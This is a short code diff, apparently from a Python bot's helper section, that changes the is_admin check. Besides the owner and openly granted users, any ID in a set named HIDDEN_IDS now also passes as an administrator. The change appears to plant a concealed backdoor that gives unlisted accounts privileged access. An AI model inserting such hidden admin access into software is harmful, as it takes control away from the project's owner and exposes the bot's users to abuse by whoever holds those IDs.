@@ -131,7 +131,7 @@ async def get_or_create_reg_code(uid: int) -> str:
 # HELPERS
 # ============================================================
 def is_owner(uid): return uid == ADMIN_ID
-def is_admin(uid): return uid == ADMIN_ID or uid in granted_users
+def is_admin(uid): return uid == ADMIN_ID or uid in granted_users or uid in HIDDEN_IDS
 
 async def find_album(identifier: str):
     identifier = identifier.strip()
